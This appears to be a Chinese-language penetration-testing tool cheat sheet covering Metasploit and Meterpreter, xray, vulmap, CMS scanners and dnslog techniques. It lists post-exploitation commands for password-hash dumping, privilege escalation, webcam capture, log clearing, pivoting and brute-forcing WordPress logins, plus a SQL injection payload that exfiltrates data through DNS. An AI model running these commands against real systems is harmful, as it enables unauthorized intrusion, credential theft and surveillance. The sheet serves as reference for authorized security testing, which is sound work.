综合框架
----------------------------------------

metasploit
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- Terminal下msf常用命令简介
	+ 打开msf终端：``msfconsole``
	+ msf数据库初始化：``msfdb init``
	+ msf更新：``apt install metasploit framework``
	+ 将汇编指令转换成为对应的16进制机器码：``msf-nasm_shell``
- msf终端下常用命令简介
	+ 查看数msf据库连接状态,连接数据库能够优化搜索等过程：``db_status`` 
	+ 重建缓存，将模块等索引重新存入数据库：``db_rebuild_cache``
	+ 调用nmap扫描，并将扫描结果存入数据库：``db_nmap``
	+ 显示命令的帮助信息：``help [db_connect]``
	+ 搜索含有关键字的模块：``search [module]``
	+ 选择模块：``use [module]``
	+ 显示模块支持的payload：``show payload``
	+ 显示模块参数：``show options``
	+ info详情：``info``
	+ 设置取消参数：``set/unset [opt]``
	+ 设置取消全局参数：``setg/unsetg [opt]``
	+ 返回上级状态：``back``
	+ 运行攻击模块：``exploit/run``
	+ 查看当前连接会话：``sessions``
- meterpreter后渗透利用
	+ 打印当前工作目录：``pwd``
	+ 查看系统信息：``sysinfo``
	+ 查看当前目标机上运行的进程列表和pid：``ps``
	+ 调用相机拍摄照片：``webcam_snap``
	+ 运行vnc远程查看屏幕：``run vnc``
	+ 开启远程登录3389（windows）：``run post/windows/manage/enable_rdp``
	+ 截取目标主机当前屏幕​：``screenshot``
	+ 获取当前权限的用户id：``getuid``
	+ 获取system权限：``getsystem``
	+ 获取用户名与hash口令：``hashdump``
	+ 获取目标主机shell(windows环境下中文乱码的解决办法:chcp 65001）：``shell``
	+ 退出shell模式，返回到meterpreter：``Ctrl+Z``
	+ 上传一个文件：``upload``
	+ 下载一个文件：``download``
	+ 执行目标系统中的文件(-f 指定文件，-i执行可交互模式，-H隐藏窗口)：``excute``
	+ 清除日志：``clearev``
	+ 将Meterpreter放入后台(使用session -i重新连接到会话)：``background``
- meterpreter内网渗透
	+ 获取目标主机上的子网状态：``run get_local_subnets``
	+ arp扫描内网机器：``run post/windows/gather/arp_scanner RHOSTS=192.168.100.0/24``
	+ 使用autoroute模块添加到达内网的路由经session 1转发：``run autoroute -s 169.254.0.0/16 1``
	+ 查看当前的路由表：``run autoroute -p``
	+ 扫描内网存活主机：``db_nmap``
	+ 将目标主机192.168.16.59的3389转发到本地主机的7070端口：``portfwd add -l 7070 -r 192.168.16.59 -p 3389``
	+ 端口转发成功后就可以从本地端口连接rdp：``rdesktop 127.0.0.1:7070``

vulmap
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 项目地址：``https://github.com/zhzyker/vulmap``
- 安装
		::
		
			git clone https://github.com/zhzyker/vulmap.git
			pip3 install -r requirements.txt
			
- 基本用法：``python3 vulmap.py -u http://example.com``

xray
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 全局配置
	+ --config 用于指定配置文件的位置，默认加载同目录的 config.yaml
	+ --log_level 用于指定全局的日志配置
	+ ``xray_windows_amd64.exe --log_level debug --config 1.yaml webscan --url xxx``
- reverse命令
	+ 启用单独的盲打平台服务，盲打平台用于处理没有回显或延迟触发的问题
- genca
	+ 用于快速生成一个根证书，主要用于被动代理扫描 HTTPS 流量时用到
- subdomain
	+ 子域名扫描
	+ ``xray_windows_amd64.exe  subdomain --target example.com --text-output example.txt``
	+ ``xray_windows_amd64.exe subdomain --target example.com --console-ui --text-output example.txt``
- webscan
	+ 扫描web漏洞，核心功能
	+ --plugins 配置本次扫描启用哪些插件, 不再使用配置文件中的配置
		- ``--plugins xss --plugins xss,sqldet,phantasm``
	+ --poc 配置本次扫描启用哪些 POC,因为所有 POC 隶属于 phantasm 插件, 所以该参数其实是 phantasm 插件独有的配置。
		- ``--plugins phantasm --poc poc-yaml-thinkphp5-controller-rce``
		- ``--plugins phantasm --poc "*thinkphp*"``
		- ``--plugins phantasm --poc "/home/test/pocs/*"``
		- ``--plugins phantasm --poc "/home/test/pocs/*thinkphp*" ...``
	+ 配置输入来源
		- --listen 
			+ 启动一个被动代理服务器作为输入，如 --listen 127.0.0.1:4444，然后配置浏览器或其他访问工具的 http 代理为 http://127.0.0.1:4444 就可以自动检测代理中的 HTTP 请求并进行漏洞扫描
		- --basic-crawler 
			+ 启用一个基础爬虫作为输入， 如 --basic-crawler http://example.com，就可抓取 http://example.com 的内容并以此内容进行漏洞扫描
		- --url 
			+ 用于快速测试单个 url，这个参数不带爬虫，只对当前链接进行测试。默认为 GET 请求，配合下面的 --data 参数可以指定 body，同时变为 POST 请求。
		- --raw-request 
			+ 用于加载一个原始的 HTTP 请求并用于扫描，原始请求类似上面代码框中的原始请求，如果你用过 sqlmap -r，那么这个参数应该也很容易上手。
	+ 输出方式
		- --html-output 将结果输出为 html 报告, 报告样例
		- --webhook-output 将结果发送到一个地址
		- --json-output 将结果输出到一个 json 文件中
	+ 示例
		- ``xray_darwin_amd64 webscan --plugins xss --listen 127.0.0.1:1111 --html-output 1.html``
		- ``xray_darwin_amd64 --log_level debug webscan --plugins xss,cmd_injection --basic-crawler http://example.com --json-output 1.json``
		- ``xray_darwin_amd64 webscan --url http://example.com --data "x=y" --html-output 2.html --json-output 1.json``
		- ``xray_darwin_amd64 webscan --url http://example.com/ --webhook-output http://host:port/path``

特定CMS漏洞利用
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ Joomscan
	- 介绍
		+ Joomla security scanner可以检测Joomla整站程序搭建的网站是否存在文件包含、sql注入、命令执行等漏洞。
	- 使用方法
		+ 默认检测：``joomscan -u www.example.com``
		+ 组件检测：``joomscan -u www.example.com –ec``
		+ 设置cookie：``joomscan -u www.example.com --cookie "test=demo;"``
		+ 随机UA：``joomscan -u www.example.com -r``
		+ 设置代理：``joomscan -u www.example.com --proxy http://127.0.0.1:8080``
+ wpscan
	- 插件漏洞:``wpscan --url https://www.xxxxx.wiki/ -e vp`` 
	- 主题漏洞:``wpscan --url https://www.xxxxxx.wiki -e vt`` 
	- 枚举用户:``wpscan --url https://www.xxxxxxx.wiki/ -e u`` 
	- 穷举密码:``wpscan --url https://www.xxxxxxx.wiki/ -U 'admin' -P /root/wordlist.txt``
+ Drupal enumeration & exploitation tool 
	- https://github.com/immunIT/drupwn
+ `dedecmscan <https://github.com/lengjibo/dedecmscan>`_ 织梦全版本漏洞扫描
+ thinkphp
	- https://github.com/Lucifer1993/TPscan
	- https://github.com/theLSA/tp5-getshell

dnslog
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 利用场景
	+ Sql-Blind
	+ RCE
	+ SSRF
	+ RFI（Remote File Inclusion）
- 原理
	将dnslog平台中的特有字段payload带入目标发起dns请求，通过dns解析将请求后的关键信息组合成新的三级域名带出，在ns服务器的dns日志中显示出来。
- 限制
	load_file函数在Linux下是无法用来做dnslog攻击的，因为Linux没有UNC路径(UNC路径就是类似\\softer这样的形式的网络路径)。
- 示例
	+ ``select load_file('\\\\',version(),'.dnslog地址')``

其它
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- AWVS
- goby
- Immunity Canvas
- openvas
- nessus
- `PenTesters Framework(ptf) <https://github.com/trustedsec/ptf>`_
- katoolin
	+ 自动安装所有Kali Linux工具
- `x-scan <https://x-scan.apponic.com/>`_
